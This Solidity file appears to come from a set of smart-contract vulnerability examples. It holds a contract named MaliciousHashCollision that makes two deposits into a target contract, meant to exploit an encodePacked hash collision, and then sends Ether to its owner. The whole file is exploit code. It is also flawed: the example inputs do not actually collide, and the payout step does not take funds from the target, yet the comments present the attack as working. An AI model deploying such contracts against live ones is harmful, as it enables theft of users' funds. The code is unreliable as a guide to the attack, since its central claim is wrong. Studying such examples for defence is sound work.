// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./Hash-collisions.sol";

contract MaliciousHashCollision {
    HashCollisionBug public targetContract;
    address payable public owner;

    constructor(address _targetContract) {
        targetContract = HashCollisionBug(_targetContract);
        owner = payable(msg.sender);
    }

    function exploitHashCollision() external payable {
        require(msg.value > 0, "Must send Ether to perform attack");

        // Example of two different inputs that cause a hash collision
        string memory input1 = "AAA";
        string memory input2 = "AAABBB";

        // First deposit with strings causing known hash collision
        targetContract.deposit{value: msg.value}(input1, "BBB");

        // Exploit: submit a second deposit with a different set of colliding inputs
        targetContract.deposit(input2, "BB");

        // If the second hash overwrites the first, the attack succeeds
        uint256 balance = targetContract.balances(targetContract.createHash(input1, "BBB"));
        owner.transfer(balance);
    }
}